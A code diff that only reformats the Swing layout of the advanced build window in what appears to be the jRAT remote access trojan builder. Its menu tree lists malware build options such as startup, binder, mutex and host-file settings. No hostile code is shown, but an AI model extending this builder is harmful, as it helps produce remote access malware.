@@ -40,8 +40,6 @@ import pro.jrat.ui.panels.PanelBuildVisibility;
 import pro.jrat.ui.renderers.JTreeIconsRenderer;
 import pro.jrat.utils.IconUtils;
 
-
-
 @SuppressWarnings("serial")
 public class FrameBuildAdvanced extends BaseFrame {
 
@@ -63,7 +61,7 @@ public class FrameBuildAdvanced extends BaseFrame {
 		setContentPane(contentPane);
 
 		JTreeIconsRenderer renderer = new JTreeIconsRenderer();
-		
+
 		renderer.icons.put("final", IconUtils.getIcon("final", true));
 		renderer.icons.put("general", IconUtils.getIcon("id", true));
 		renderer.icons.put("network", IconUtils.getIcon("host", true));
@@ -85,25 +83,12 @@ public class FrameBuildAdvanced extends BaseFrame {
 
 		panel = new JPanel();
 		panel.setBorder(BorderFactory.createLineBorder(Color.gray.brighter()));
-		
+
 		JScrollPane scrollPane = new JScrollPane();
 		GroupLayout gl_contentPane = new GroupLayout(contentPane);
-		gl_contentPane.setHorizontalGroup(
-			gl_contentPane.createParallelGroup(Alignment.LEADING)
-				.addGroup(gl_contentPane.createSequentialGroup()
-					.addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 150, GroupLayout.PREFERRED_SIZE)
-					.addPreferredGap(ComponentPlacement.RELATED)
-					.addComponent(panel, GroupLayout.DEFAULT_SIZE, 458, Short.MAX_VALUE))
-		);
-		gl_contentPane.setVerticalGroup(
-			gl_contentPane.createParallelGroup(Alignment.TRAILING)
-				.addGroup(gl_contentPane.createSequentialGroup()
-					.addGroup(gl_contentPane.createParallelGroup(Alignment.LEADING)
-						.addComponent(panel, GroupLayout.DEFAULT_SIZE, 313, Short.MAX_VALUE)
-						.addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 313, GroupLayout.PREFERRED_SIZE))
-					.addContainerGap())
-		);
-		
+		gl_contentPane.setHorizontalGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addGroup(gl_contentPane.createSequentialGroup().addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 150, GroupLayout.PREFERRED_SIZE).addPreferredGap(ComponentPlacement.RELATED).addComponent(panel, GroupLayout.DEFAULT_SIZE, 458, Short.MAX_VALUE)));
+		gl_contentPane.setVerticalGroup(gl_contentPane.createParallelGroup(Alignment.TRAILING).addGroup(gl_contentPane.createSequentialGroup().addGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addComponent(panel, GroupLayout.DEFAULT_SIZE, 313, Short.MAX_VALUE).addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 313, GroupLayout.PREFERRED_SIZE)).addContainerGap()));
+
 		tree = new JTree();
 		scrollPane.setViewportView(tree);
 		tree.setShowsRootHandles(true);
@@ -134,21 +119,21 @@ public class FrameBuildAdvanced extends BaseFrame {
 
 		tree.setCellRenderer(renderer);
 		contentPane.setLayout(gl_contentPane);
-		
+
 		loadPanels();
-		
+
 		panel.add(panels.get("general"));
 	}
-	
+
 	public void addNodes(DefaultMutableTreeNode n) {
-		n.add(new DefaultMutableTreeNode("General"));	
+		n.add(new DefaultMutableTreeNode("General"));
 		n.add(new DefaultMutableTreeNode("Network"));
 		n.add(new DefaultMutableTreeNode("Startup"));
 		n.add(new DefaultMutableTreeNode("Install Message"));
 		n.add(new DefaultMutableTreeNode("Binder"));
 		n.add(new DefaultMutableTreeNode("Mutex"));
 		n.add(new DefaultMutableTreeNode("Allowed OS"));
-		n.add(new DefaultMutableTreeNode("Timeout"));	
+		n.add(new DefaultMutableTreeNode("Timeout"));
 		n.add(new DefaultMutableTreeNode("Delay"));
 		n.add(new DefaultMutableTreeNode("Host File"));
 		n.add(new DefaultMutableTreeNode("Plugins"));
